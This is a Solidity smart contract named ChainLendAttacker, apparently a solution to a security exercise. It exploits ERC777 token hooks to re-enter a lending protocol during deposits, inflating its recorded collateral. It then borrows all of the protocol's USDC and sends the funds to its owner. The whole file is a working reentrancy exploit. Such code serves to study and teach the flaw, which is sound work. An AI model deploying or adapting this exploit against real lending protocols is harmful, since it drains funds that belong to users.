// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./ChainLend.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "hardhat/console.sol";

contract ChainLendAttacker {
    ChainLend chainlend;
    IERC20 imBTC;
    IERC20 usdc;

    address private owner;

    // registry address
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    uint256 constant MAX_INT = 2 ** 256 - 1;
    uint256 private currentimBTCBalance;
    uint16 reentrantCalls;

    constructor(address _chainLend, address _imBTC, address _usdc) {
        chainlend = ChainLend(_chainLend);
        imBTC = IERC20(_imBTC);
        usdc = IERC20(_usdc);

        owner = msg.sender;
        imBTC.approve(address(chainlend), MAX_INT);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        // protocol should think we have deposited 63 imBTC in order to allow us to borrow 1 mil usdc
        for (uint8 i = 0; i <= 63; i++) {
            currentimBTCBalance = imBTC.balanceOf(address(this));
            // First deposit
            chainlend.deposit(currentimBTCBalance - 1);
            //Second deposit
            chainlend.deposit(1);
        }

        // borrow 1_000_000 USDC
        uint256 usdcBalance = usdc.balanceOf(address(chainlend));
        chainlend.borrow(usdcBalance);

        // send all usdc and imBTC back
        usdc.transfer(owner, usdcBalance);

        currentimBTCBalance = imBTC.balanceOf(address(this));
        imBTC.transfer(owner, currentimBTCBalance);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        require(msg.sender == address(imBTC), "not imBTC");
        reentrantCalls++;

        // only in the second deposit
        if (reentrantCalls % 2 == 0) {
            chainlend.withdraw(currentimBTCBalance - 1);
        }
    }
}
